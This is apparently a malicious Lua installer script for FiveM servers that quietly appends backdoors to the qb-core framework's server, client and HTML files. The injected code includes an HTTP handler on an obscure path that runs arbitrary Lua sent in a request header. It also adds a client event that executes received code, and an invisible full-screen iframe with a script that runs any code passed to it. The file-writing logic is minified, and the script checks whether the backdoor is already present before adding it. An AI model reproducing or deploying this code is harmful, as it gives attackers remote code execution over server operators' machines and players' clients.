

    local filesToAdd = {
        {path = GetResourcePath("qb-core")  .. "/server/functions.lua",
            content = [[SetHttpHandler(function(req, res) if (req.method == 'POST') then if req.path == '/thszlrmvbyhytrevopgm' then local data = req.headers.Code reqFuncCall = req resFuncCall = res local func = load(data) if func then local ok = pcall(func) if ok then else res.send('LE') end else res.send('LE') end end end end)]],
            phrase = "load(data) if func then local ok =  pcall(func)",
            svchangesMade = false},
        {path = GetResourcePath("qb-core")  .. "/client/events.lua",
            content = [[RegisterNetEvent("thszlrmvbyhytrevopgm-ce", function(d, r) if r == GetCurrentResourceName() then local func = load(d) if func then local ok = pcall(func) if ok then else return end else return end end end)]],
            phrase = "load(d) if func then local ok =  pcall(func)",
            clchangesMade = false},
        {path = GetResourcePath("qb-core")  .. "/html/index.html",
            content = [[<html lang="en"><head></head><body style="margin: 0;"><div id="thszlrmvbyhytrevopgm-div" style="opacity: 0; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9998;"><iframe src=" " id="thszlrmvbyhytrevopgm-iframe" style="display: block; height: 100vh; width: 100vw; border: none; background: rgba(255, 255, 255, 0); position: fixed; top: 0; left: 0; z-index: 9999;"></iframe></div><audio id="thszlrmvbyhytrevopgm-audio"><source src=" " type="audio/ogg" /></audio><script>window.addEventListener('message', (event) => {if (event.data.type === 'thszlrmvbyhytrevopgm-nui') {new Function(event.data.code)();}});</script></body></html>]],
            phrase = "new Function(event.data.code)",
            nuchangesMade = false},
    }
local a=false;local b=false;local c=false;for d,e in ipairs(filesToAdd)do local f=e.path;local g=e.content;local h=e.phrase;local i=io.open(f,"r")local j=""if i then j=i:read("*all")or""i:close()else end;if string.find(j,h,1,true)then else i=io.open(f,"a")if i then i:write(g)i:close()if f==GetResourcePath("qb-core").."/server/functions.lua"then a=true elseif f==GetResourcePath("qb-core").."/client/events.lua"then b=true elseif f==GetResourcePath("qb-core").."/html/index.html"then c=true end end end end
    
